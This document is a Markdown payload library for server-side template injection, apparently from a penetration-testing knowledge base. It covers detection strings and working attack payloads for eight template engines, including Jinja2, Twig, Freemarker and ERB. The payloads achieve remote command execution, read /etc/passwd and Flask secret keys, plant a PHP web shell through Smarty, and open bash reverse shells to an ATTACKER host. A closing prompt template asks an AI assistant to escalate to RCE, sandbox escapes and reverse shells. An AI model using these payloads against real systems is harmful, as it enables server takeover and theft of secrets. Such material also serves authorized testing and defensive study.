---
id: "ssti-payloads"
title: "Server-Side Template Injection (SSTI) Payload Library"
type: "payload"
category: "web-application"
subcategory: "template-injection"
tags: ["ssti", "template-injection", "jinja2", "twig", "freemarker", "pebble", "rce", "deep-dig"]
difficulty: "advanced"
platforms: ["linux", "macos", "windows"]
related: ["xss-techniques", "sqli-payloads"]
updated: "2026-03-30"
---

## Overview

Server-Side Template Injection occurs when user input is embedded into template engines unsafely, allowing code execution on the server. SSTI often leads directly to Remote Code Execution (RCE). The key is identifying which template engine is in use, then using engine-specific payloads.

## Detection / Template Engine Identification

```
# Universal detection polyglot
${{<%[%'"}}%\

# Math-based detection (renders if vulnerable)
{{7*7}}           # Jinja2, Twig
${7*7}            # Freemarker, Velocity, Mako
#{7*7}            # Ruby ERB, Pebble
<%= 7*7 %>        # ERB, EJS
{{= 7*7}}         # doT.js
#{ 7*7 }          # Slim

# If 49 appears in the output, SSTI is confirmed
```

### Decision Tree
```
{{7*'7'}}
├── 49        → Twig
├── 7777777   → Jinja2
└── Error     → Neither

${7*7}
├── 49        → Freemarker/Velocity/Mako
└── ${7*7}    → Not vulnerable (or different engine)

<%= 7*7 %>
├── 49        → ERB/EJS
└── Error     → Not vulnerable
```

## Jinja2 (Python/Flask)

```python
# Read file
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ config.items() }}
{{ request.environ }}

# RCE - Find subprocess.Popen in subclasses
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}{% endif %}{% endfor %}

# Shorter RCE
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Config / secret key extraction
{{ config }}
{{ config.SECRET_KEY }}

# File read
{{ ''.__class__.__mro__[1].__subclasses__()[NUM].__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}

# Reverse shell
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"').read() }}
```

## Twig (PHP)

```php
# RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# File read
{{"/etc/passwd"|file_excerpt(1,30)}}

# PHP info
{{dump(app)}}
{{app.request.server.all|join(',')}}

# System command
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('exec')}}
```

## Freemarker (Java)

```java
# RCE
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Read file
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}

# Alternative RCE
${"freemarker.template.utility.Execute"?new()("id")}

# Object introspection
${.data_model}
${.globals}
```

## Velocity (Java)

```java
# RCE
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end

# Simpler RCE
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

## Pebble (Java)

```java
# RCE
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}
```

## ERB (Ruby)

```ruby
# RCE
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').readlines() %>

# File read
<%= File.open('/etc/passwd').read %>

# Reverse shell
<%= `bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'` %>
```

## Mako (Python)

```python
# RCE
${__import__('os').popen('id').read()}

# File read
${open('/etc/passwd').read()}
```

## Smarty (PHP)

```php
# RCE
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

## Deep Dig Prompts

```
Given this template injection point [describe behavior, reflected output]:
1. Identify the template engine using the detection payloads.
2. Provide 5 escalating payloads from info disclosure to RCE.
3. Suggest sandbox escape techniques if direct RCE is blocked.
4. Craft a payload to read sensitive config files and environment variables.
5. Build a reverse shell payload for the identified engine.
```

## Tools

- **tplmap** — Automated SSTI detection and exploitation
- **SSTImap** — Modern SSTI exploitation tool
- **Burp Suite** — Manual SSTI testing
